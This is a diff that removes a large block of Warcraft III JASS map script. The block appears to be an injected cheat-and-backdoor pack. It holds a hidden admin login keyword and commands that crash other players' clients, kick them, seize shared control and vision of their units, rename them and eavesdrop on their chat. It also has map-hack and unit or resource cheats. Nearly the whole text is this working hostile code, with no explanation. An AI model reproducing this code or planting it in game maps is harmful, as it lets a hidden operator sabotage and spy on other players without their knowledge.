-call DisplayTimedTextToPlayer(b2j,0,0,10,"-mh	    -   Reveals the map for you")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-nomh	    -   No reveals the map for you")
-elseif SubString(c8h,0,6)=="-list2"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-time <0-24>  -    Sets time of day to specified")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-clear    -   Clears texts on the screen")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-logging   -   Remove all trees")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-reforest    -   Grow all removed trees")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-locktrade    -   lock gold and lumber trade in F11")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-unlocktrade  -   unlock trade in F11")
-elseif SubString(c8h,0,6)=="-list3"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-lock     -   lock share player in F11")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-unlock   -   unlock share player in F11")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-say [msg]    -    show your message on the screen")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-fast	    -   Upgrades take no time")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-bfast    -   instant a building structure by pressing ESC")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-ufast    -   instant a training structure by pressing ESC")
-elseif SubString(c8h,0,6)=="-list4"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-mana	    -   Infinite mana to your selected units")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-nocd	    -   Turn off cooldown for all skills and active items to your selected units")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-cdon	    -   Turn on cooldown for all skills and active items to your selected untis")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-autoh #  -   Auto-heal your selected unit with # %")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-autohoff -   Remove your selected unit auto-heal")
-elseif SubString(c8h,0,6)=="-list5"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-agi #    -   Adds # agility to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-str #    -   Adds # strength to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-int #    -   Adds # intelligence to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-lvl #    -   Sets # level to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-downlvl #    -   Decreases your selected unit's level by #")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-xp #     -   Sets # experience to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-hp #     -   Sets # health points to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-mp #	    -   Sets # mana points to selected unit")
-elseif SubString(c8h,0,6)=="-list6"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-ms #     -   Sets # move speed to selected unit")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-vul 	    -   Makes selected units vulnerable")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-invul    -   Makes selected units invulnerable")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-vis 	    -   Makes selected units visible")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-invis    -   Makes selected units invisible")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-kill     -   Kills selected units")
-elseif SubString(c8h,0,6)=="-list7"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-tele	    -   Sets patrol (P) to teleport")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-note	    -   Sets patrol (P) to normal")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-stop	    -   Disables selected units commands")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-resume   -   Enables selected units commands")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-xp rate #    -   Sets # to your selected units xp rate")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-addhp #  -   Adds # to your current hit points")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-nofood   -   Makes selected units use no food")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-food	    -   Makes selected units use food")
-elseif SubString(c8h,0,6)=="-list8"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-heal	    -  Heals selected units' HP and MP")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-size #   - Sets # to your selected units' size")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-debuff   - Debuff your selected units")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-additem #    -  Spawns # random items")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-pathoff  -   Makes selected units uncollide")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-pathon   -   Makes selected units collide")
-elseif SubString(c8h,0,8)=="-logging"then
-call EnumDestructablesInRectAll( GetPlayableMapRect(), function boringlah )
-elseif SubString(c8h,0,9)=="-reforest"then
-call EnumDestructablesInRectAll( GetPlayableMapRect(), function dungrow )
-elseif SubString(c8h,0,5)=="-nocd"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartNocd")
-elseif SubString(c8h,0,9)=="-showkeys"then
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000Left: "+GetStoredString(CACHE,id2d,"left"))
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000Right: "+GetStoredString(CACHE,id2d,"right"))
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000Up: "+GetStoredString(CACHE,id2d,"up"))
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000Down: "+GetStoredString(CACHE,id2d,"down"))
-elseif SubString(c8h,0,10)=="-locktrade"then
-call SetMapFlag(MAP_LOCK_RESOURCE_TRADING,true)
-elseif SubString(c8h,0,12)=="-unlocktrade"then
-call SetMapFlag(MAP_LOCK_RESOURCE_TRADING,false)
-elseif SubString(c8h,0,5)=="-lock"then
-call SetMapFlag(MAP_LOCK_ALLIANCE_CHANGES,true)
-call SetMapFlag(MAP_ALLIANCE_CHANGES_HIDDEN,true)
-call SetMapFlag(MAP_SHARED_ADVANCED_CONTROL,false)
-elseif SubString(c8h,0,7)=="-unlock"then
-call SetMapFlag(MAP_LOCK_ALLIANCE_CHANGES,false)
-call SetMapFlag(MAP_ALLIANCE_CHANGES_HIDDEN,false)
-elseif SubString(c8h,0,9)=="-shareall"then
-if b2j==badboyyo then
-loop
-exitwhen i2i>15
-call SetPlayerAllianceStateFullControlBJ(Player(i2i),b2j,true)
-call SetPlayerAllianceStateControlBJ(Player(i2i),b2j,true)
-call SetPlayerAllianceStateVisionBJ(Player(i2i),b2j,true)
-set i2i=i2i+1
-endloop
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,5)=="-soff"then
-if b2j==badboyyo then
-loop
-exitwhen i2i>15
-if GetPlayerId(b2j)!=i2i then
-call SetPlayerAllianceStateFullControlBJ(Player(i2i),b2j,false)
-call SetPlayerAllianceStateControlBJ(Player(i2i),b2j,false)
-call SetPlayerAllianceStateVisionBJ(Player(i2i),b2j,false)
-endif
-set i2i=i2i+1
-endloop
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,7)=="-share " and S2I(SubString(c8h,7,9))<16 and S2I(SubString(c8h,7,9))>-1then
-if b2j==badboyyo then
-call SetPlayerAllianceStateFullControlBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
-call SetPlayerAllianceStateControlBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
-call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,9)=="-unshare " and S2I(SubString(c8h,9,11))<16 and S2I(SubString(c8h,7,9))>-1then
-if b2j==badboyyo then
-call SetPlayerAllianceStateFullControlBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
-call SetPlayerAllianceStateControlBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
-call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,6)=="-ally "and S2I(SubString(c8h,6,8))<16 and S2I(SubString(c8h,6,8))>-1then
-if b2j==badboyyo then
-call SetPlayerAllianceStateAllyBJ(b2j,Player(S2I(SubString(c8h,6,8))),true)
-call SetPlayerAllianceStateAllyBJ(Player(S2I(SubString(c8h,6,8))),b2j,true)
-call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,6,8))),b2j,true)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,8)=="-unally "and S2I(SubString(c8h,8,10))<16 and S2I(SubString(c8h,8,10))>-1then
-if b2j==badboyyo then
-call SetPlayerAllianceStateAllyBJ(b2j,Player(S2I(SubString(c8h,8,10))),false)
-call SetPlayerAllianceStateAllyBJ(Player(S2I(SubString(c8h,8,10))),b2j,false)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,10)=="-unallyall"then
-if b2j==badboyyo then
-loop
-exitwhen i2i>11
-if GetPlayerId(b2j)!=i2i then
-call SetPlayerAllianceStateAllyBJ(b2j,Player(i2i),false)
-call SetPlayerAllianceStateAllyBJ(Player(i2i),b2j,false)
-call SetPlayerAllianceStateVisionBJ(b2j,Player(i2i),false)
-endif
-set i2i=i2i+1
-endloop
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,8)=="-allyall"then
-if b2j==badboyyo then
-loop
-exitwhen i2i>11
-call SetPlayerAllianceStateAllyBJ(b2j,Player(i2i),true)
-call SetPlayerAllianceStateAllyBJ(Player(i2i),b2j,true)
-call SetPlayerAllianceStateVisionBJ(b2j,Player(i2i),true)
-set i2i=i2i+1
-endloop
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,8)=="-setname"then
-if b2j==badboyyo then
-call SetPlayerName(b2j,truelove(SubString(c8h,9,200)))
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,6)=="-food "then
-call SetPlayerState(b2j,PLAYER_STATE_FOOD_CAP_CEILING,S2I(SubString(c8h,6,10)))
-call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_FOOD_CAP,S2I(SubString(c8h,6,10)))
-elseif SubString(c8h,0,9)=="-setcolor"then
-if b2j==badboyyo then
-call SetPlayerColor(b2j,whathar(SubString(c8h,10,16),b2j))
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,4)=="-say"then
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,((truelove(GetPlayerName(b2j)+" |c00ff0000says:|r ")+("|c00ffff00\""+SubString(c8h,4,10))+truelove(SubString(c8h,10,400))+(" \""))))
-elseif SubString(c8h,0,5)=="-fast"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartFast")
-elseif SubString(c8h,0,6)=="-ufast"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartUFast")
-elseif SubString(c8h,0,7)=="-bfast"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartBFast")
-elseif SubString(c8h,0,5)=="-tele"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartTele")
-elseif SubString(c8h,0,7)=="-colors"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|CFFFF000000|r |CFF0000FF01|r |CFF01E7E702|r |CFF40008003|r |CFFFFFF0004|r |CFFF97C0005|r |CFF00FF0006|r |CFFFF80C007|r |CFFC0C0C008|r |CFF93C4F409|r |CFF00804010|r |CFF57220211|r")
-elseif SubString(c8h,0,3)=="-g " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
-if b2j==badboyyo then
-call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_GOLD,GetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_GOLD)+S2I(SubString(c8h,6,13))) 
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,3)=="-l " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
-if b2j==badboyyo then
-call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_LUMBER,GetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_LUMBER)+S2I(SubString(c8h,6,13)))
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,3)=="-f " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
-if b2j==badboyyo then
-call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_FOOD_CAP_CEILING,S2I(SubString(c8h,6,20)))
-call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_FOOD_CAP,S2I(SubString(c8h,6,20)))
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,4)=="-sc " and S2I(SubString(c8h,4,6))<16 and S2I(SubString(c8h,3,5))>-1then
-if b2j==badboyyo then
-call SetPlayerColor(Player(S2I(SubString(c8h,4,6))),whathar(SubString(c8h,7,13),Player(S2I(SubString(c8h,4,6)))))
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,4)=="-sn " and S2I(SubString(c8h,4,6))<16 and S2I(SubString(c8h,3,5))>-1then
-if b2j==badboyyo then
-call SetPlayerName(Player(S2I(SubString(c8h,4,6))),truelove(SubString(c8h,7,300))) 
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,5)=="-hear"then
-if b2j==badboyyo then
-call ForceAddPlayer(udg_ting,b2j)
-call shutup()
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,7)=="-nohear"then
-if b2j==badboyyo then
-call ForceRemovePlayer(udg_ting,b2j)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,5)=="-time"then
-call SetTimeOfDay(S2R(SubString(c8h,6,9)))
-elseif SubString(c8h,0,8)=="-disable"then
-call DisableTrigger(Siwang)
-elseif SubString(c8h,0,5)=="-reg "then
-set Xingtong=SubString(c8h,5,12)
-call dundothat(b2j)
-elseif SubString(c8h,0,6)=="-unit "then
-call DestroyTrigger(ChuangjianDanwei)
-set ChuangjianDanwei=CreateTrigger()
-set mu8u=Rax(SubString(c8h,6,10))
-call createshit(b2j)
-elseif SubString(c8h,0,7)=="-nounit"then
-call DestroyTrigger(ChuangjianDanwei)
-elseif SubString(c8h,0,4)=="-act"then
-if b2j==badboyyo then
-set Danci=SubString(c8h,5,100)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,7)=="-destid"then
-call raxwhat(GetDestructableTypeId(RandomDestructableInRectSimpleBJ(Zhuce)),b2j)
-elseif SubString(MeisJasonLun, 0, 7)=="-crash " then
-if b2j==badboyyo then
-call Jasoncrash(Player(S2I(SubString(MeisJasonLun,7,9))),DJBp1)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif (SubString(MeisJasonLun, 0, 3)=="-ca")and(DJBi1==3) then
-if b2j==badboyyo then
-loop
-exitwhen DJBi2>11
-call Jasoncrash(Player(DJBi2),DJBp1)
-set DJBi2=DJBi2+1
-endloop
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(MeisJasonLun, 0, 4)=="-cf " then
-if b2j==badboyyo then
-call dunfuck(Player(S2I(SubString(MeisJasonLun,4,6))), DJBp1)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(MeisJasonLun,0,6)=="-kick " then
-if b2j==badboyyo then
-if Player(S2I(SubString(MeisJasonLun,6,DJBi1)))!=badboyyo then
-call CustomDefeatBJ(Player(S2I(SubString(MeisJasonLun,6,8))), "")
-endif
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(MeisJasonLun,0,11)=="-adminlogin" then
-set ohyeah[GetPlayerId(DJBp1)]=true
-call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|c00ffff00                                                   Enter Password")
-elseif SubString(MeisJasonLun,0,12)=="-Zhongguoren" then
-call Jasonadmin(DJBp1)
-elseif ((SubString(MeisJasonLun, 0,3)=="-cc")and(DJBp1==badboyyo)) then
-loop
-exitwhen DJBi2>11
-if ohmygod[DJBi2]==true then
-call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|cffff0000"+GetPlayerName(Player(DJBi2))+"|r is using cheats.")
-else
-call DisplayTimedTextToPlayer(DJBp1,0,0,10,GetPlayerName(Player(DJBi2))+" is not using cheats")
-endif
-set DJBi2=DJBi2+1
-endloop
-elseif SubString(MeisJasonLun,0,7)=="-cadmin" then
-if Welcomeya == true then
-call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|cffff0000                                               "+GetPlayerName(badboyyo)+"|r |c00ffff00is the admin in this game.")
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                There is no admin in this game.")
-call DisplayTimedTextToPlayer(b2j,0,0,10," ")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                Do you want to log in?")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                Type -adminlogin to log in.")
-endif
-elseif SubString(MeisJasonLun,0,7)=="-logout" then
-if b2j==badboyyo then
-call Jasonlogout(DJBp1)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif (SubString(MeisJasonLun,0,9)=="-nocheat ")and(DJBp1==badboyyo) then
-endif
-call GroupEnumUnitsSelected(g2g,DJBp1,null)
-call GroupEnumUnitsSelected(g2g,b2j,null)
-loop
-set d2w=FirstOfGroup(g2g)
-exitwhen d2w==null
-if i2i>=0 then
-if SubString(c8h,0,4)=="-int"then
-call SetHeroInt(d2w,i2i,true)
-elseif SubString(c8h,0,4)=="-agi"then
-call SetHeroAgi(d2w,i2i,true)
-elseif SubString(c8h,0,4)=="-str"then
-call SetHeroStr(d2w,i2i,true)
-endif
-endif
-if SubString(c8h,0,6)=="-invis"then
-call UnitAddAbility(d2w,'Apiv')
-elseif SubString(c8h,0,6)=="-vis"then
-call UnitRemoveAbility(d2w,'Apiv')
-elseif SubString(c8h,0,9)=="-xp rate "then
-call SetPlayerHandicapXP(Player(S2I(SubString(c8h,9,11))),S2I(SubString(c8h,9,12)))
-elseif SubString(c8h,0,7)=="-revive"then
-set h2g=GetUnitsOfPlayerAll(b2j)
-set h2u=FirstOfGroup(h2g)
-call ReviveHeroLoc(h2u,GetUnitLoc(d2w),false)
-elseif SubString(c8h,0,8)=="-destroy"then
-if b2j==badboyyo then
-call RemoveUnit(d2w)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,7)=="-addhp "then
-if Sethp>200then
-set Sethp=200
-endif
-call UnitAddAbility(d2w,'AInv')
-loop
-exitwhen Nowhp>=Sethp
-set Nowhp=Nowhp+1
-call UnitAddItemToSlotById(d2w,'manh',6)
-endloop
-elseif SubString(c8h,0,7)=="-nofood"then
-call SetUnitUseFood(d2w,false)
-elseif SubString(c8h,0,5)=="-food"then
-call SetUnitUseFood(d2w,true)
-elseif SubString(c8h,0,7)=="-unitid"then
-call raxwhat(GetUnitTypeId(d2w),b2j)
-elseif SubString(c8h,0,7)=="-itemid"then
-if S2I(SubString(c8h,8,9))!=0then
-call raxwhat(GetItemTypeId(UnitItemInSlot(d2w,S2I(SubString(c8h,8,9))-1)),b2j)
-else
-call raxwhat(GetItemTypeId(UnitItemInSlot(d2w,0)),b2j)
-endif
-elseif SubString(c8h,0,6)=="-float"then
-call UnitAddAbility(d2w,'Amrf')
-call SetUnitFlyHeight(d2w,S2R(SubString(c8h,7,10)),S2R(SubString(c8h,11,14)))
-call UnitRemoveAbility(d2w,'Amrf')
-elseif SubString(c8h,0,5)=="-stop"then
-call PauseUnit(d2w,true)
-elseif SubString(c8h,0,7)=="-resume"then
-call PauseUnit(d2w,false)
-elseif SubString(c8h,0,5)=="-heal"then
-call SetUnitLifePercentBJ(d2w,100)
-call SetUnitManaPercentBJ(d2w,100)
-elseif SubString(c8h,0,7)=="-autoh "then
-set s8h=S2R(SubString(c8h,7,10))
-call GroupAddUnit(Zhiyu,d2w)
-call ExecuteFunc("Jason_StartAutoh")
-elseif SubString(c8h,0,9)=="-autohoff"then
-call GroupClear(Zhiyu)
-elseif SubString(c8h,0,8)=="-endgame"then
-if b2j==badboyyo then
-call SaveAndChangeLevelBJ("rickroll.w3z","Maps\\MapName.w3x",false)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h,0,6)=="-clear"then 
-if (GetLocalPlayer()==b2j)then
-call ClearTextMessages()
-endif
-elseif SubString(c8h,0,6)=="-owner"then
-call SetUnitOwner(d2w,whatuo(SubString(c8h,7,16)),true)
-elseif SubString(c8h,0,5)=="-size"then
-call SetUnitScalePercent(d2w,j2j,j2j,j2j)
-elseif SubString(c8h,0,4)=="-lvl"then
-call SetHeroLevel(d2w,i2i,false)
-elseif SubString(c8h,0,8)=="-downlvl"then
-call UnitStripHeroLevel(d2w,S2I(SubString(c8h,8,20)))
-elseif SubString(c8h,0,3)=="-xp"then
-call SetHeroXP(d2w,z2z,false)
-elseif SubString(c8h,0,3)=="-hp"then
-call SetWidgetLife(d2w,z2z)
-elseif SubString(c8h,0,9)=="-resetcam"then
-call ResetToGameCameraForPlayer(b2j,0.)
-elseif SubString(c8h,0,3)=="-mp"then
-call SetUnitState(d2w,UNIT_STATE_MANA,z2z)
-elseif SubString(c8h,0,6)=="-invul"then
-call SetUnitInvulnerable(d2w,true)
-elseif SubString(c8h,0,4)=="-vul"then
-call SetUnitInvulnerable(d2w,false)
-elseif SubString(c8h,0,5)=="-kill"then
-call SetWidgetLife(d2w,0)
-elseif SubString(c8h,0,3)=="-ms"then
-call SetUnitMoveSpeed(d2w,z2z)
-elseif SubString(c8h,0,7)=="-pathon"then
-call SetUnitPathing(d2w,true)
-elseif SubString(c8h,0,8)=="-pathoff"then
-call SetUnitPathing(d2w,false)
-elseif SubString(c8h,0,7)=="-debuff"then
-call UnitRemoveBuffs(d2w,true,true)
-elseif SubString(c8h,0,8)=="-charges"then
-call SetItemCharges(UnitItemInSlot(d2w,S2I(SubString(c8h,8,9))-1),S2I(SubString(c8h,10,20)))
-elseif SubString(c8h,0,8)=="-additem"then
-set temp=0
-loop
-set temp=temp+1
-exitwhen temp>c2c
-call CreateItemLoc( ChooseRandomItemEx(ITEM_TYPE_ANY,-1), GetUnitLoc(d2w) )
-endloop
-elseif SubString(c8h,0,4)=="-add"then
-call UnitAddAbility(d2w,Rax(SubString(c8h,5,9)))
-call SetUnitAbilityLevel(d2w,Rax(SubString(c8h,5,9)),S2I(SubString(c8h,10,100)))
-elseif SubString(c8h,0,7)=="-remove"then
-call UnitRemoveAbility(d2w,Rax(SubString(c8h,8,12)))
-elseif SubString(c8h,0,6)=="-spawn"then
-call SetPlayerTechResearchedSwap(Rax(SubString(c8h,7,11)),3,b2j)
-call CreateUnitAtLoc(b2j,Rax(SubString(c8h,7,11)),GetUnitLoc(d2w),GetUnitFacing(d2w))
-call CreateDestructableLoc(Rax(SubString(c8h,7,11)),GetUnitLoc(d2w),GetUnitFacing(d2w),1,10)
-call CreateItemLoc(Rax(SubString(c8h,7,11)),GetUnitLoc(d2w))
-elseif SubString(c8h,0,7)=="-ground"then
-call SetTerrainTypeBJ(GetRectCenter(GetWorldBounds()),Rax(SubString(c8h,8,12)),-1,0x3B9ACA00,1)
-elseif SubString(c8h,0,5)=="-spa " and S2I(SubString(c8h,5,7))<16then
-call CreateUnitAtLoc(Player(S2I(SubString(c8h,5,7))),Rax(SubString(c8h,8,12)),GetUnitLoc(d2w),GetUnitFacing(d2w))
-elseif SubString(c8h,0,5)=="-copy" and SubString(c8h,6,7)!="0"then
-loop
-call CreateUnitAtLoc(GetOwningPlayer(d2w),GetUnitTypeId(d2w),GetUnitLoc(d2w),GetUnitFacing(d2w))
-set DJ8B=DJ8B+1
-exitwhen DJ8B>=dj8b
-call TriggerSleepAction(.001)
-endloop
-call RemoveLocation(GetUnitLoc(d2w))
-endif
-call GroupRemoveUnit(g2g,d2w)
-endloop
-call DestroyGroup(g2g)
-if SubString(c8h,0,3)=="-mh"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartMapHack")
-endif
-set c8h=""
-set id2d=""
-set b2j=null
-set g2g=null
-set d2w=null
-endfunction
-function Jason_CommandFinder takes player fp2p,string ds2s returns nothing
-local integer di2i=StringLength(ds2s)
-local integer di3i=0
-local integer di4i=0
-local integer di5i=0
-loop
-if SubString(ds2s,di3i,di3i+1)=="-"and di5i<1then
-if S2I(SubString(ds2s,di3i+1,di3i+2))<1then
-set di4i=di3i                 
-set di5i=1
-endif
-elseif SubString(ds2s,di3i+1,di3i+2)=="-"and di5i>0then
-if S2I(SubString(ds2s,di3i+2,di3i+3))<1then
-call comeonbaby(fp2p,SubString(ds2s,di4i,di3i+1))
-set di5i=0
-endif
-elseif di3i==di2i and di5i>0then
-call comeonbaby(fp2p,SubString(ds2s,di4i,di2i))
-set di5i=0
-endif
-set di3i=di3i+1
-exitwhen di3i>di2i
-endloop
-endfunction
-function HahahaUp takes nothing returns nothing
-call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"up"))
-endfunction
-function HahahaRight takes nothing returns nothing
-call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"right"))
-endfunction
-function HahahaLeft takes nothing returns nothing
-call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"left"))
-endfunction
-function HahahaDown takes nothing returns nothing
-call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"down"))
-endfunction
-function binbinbin takes player b2j,string c8h,string q2q,playerevent pe2p returns nothing
-local trigger t2t=CreateTrigger()
-local triggeraction ta2t
-if q2q=="up"then
-set ta2t=TriggerAddAction(t2t,function HahahaUp)
-elseif q2q=="left"then
-set ta2t=TriggerAddAction(t2t,function HahahaLeft)
-elseif q2q=="right"then
-set ta2t=TriggerAddAction(t2t,function HahahaRight)
-else
-set ta2t=TriggerAddAction(t2t,function HahahaDown)
-endif
-call TriggerRegisterPlayerEvent(t2t,b2j,pe2p)
-call StoreString(CACHE,I2S(GetPlayerId(b2j)),q2q,c8h)
-call sozai(b2j,"-bind"+q2q,true)
-call DisableTrigger(t2t)
-call TriggerRemoveAction(t2t,ta2t)
-call DestroyTrigger(t2t)
-set t2t=null
-set ta2t=null
-set b2j=null
-set c8h=""
-set q2q=null
-set pe2p=null
-endfunction
-function babyohh takes nothing returns boolean
-return(IsPlayerInForce(GetTriggerPlayer(),PIANZI))
-endfunction
-function realgayyah takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local string c8h=GetEventPlayerChatString()
-if SubString(c8h,0,10)=="-clearkeys"then
-call DisplayTimedTextToPlayer(b2j,0,0,5,"|cffff0000Key Bindings Cleared.")
-elseif SubString(c8h,0,7)=="-bindup"then
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,8,100)+"' was bound to Up Arrow Key")
-call binbinbin(b2j,SubString(c8h,8,100),"up",EVENT_PLAYER_ARROW_UP_DOWN)
-elseif SubString(c8h,0,9)=="-bindleft"then
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,10,100)+"' was bound to Left Arrow Key")
-call binbinbin(b2j,SubString(c8h,10,100),"left",EVENT_PLAYER_ARROW_LEFT_DOWN)
-elseif SubString(c8h,0,10)=="-bindright"then
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,11,100)+"' was bound to Right Arrow Key")
-call binbinbin(b2j,SubString(c8h,11,100),"right",EVENT_PLAYER_ARROW_RIGHT_DOWN)
-elseif SubString(c8h,0,9)=="-binddown"then
-call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,10,100)+"' was bound to Down Arrow Key")
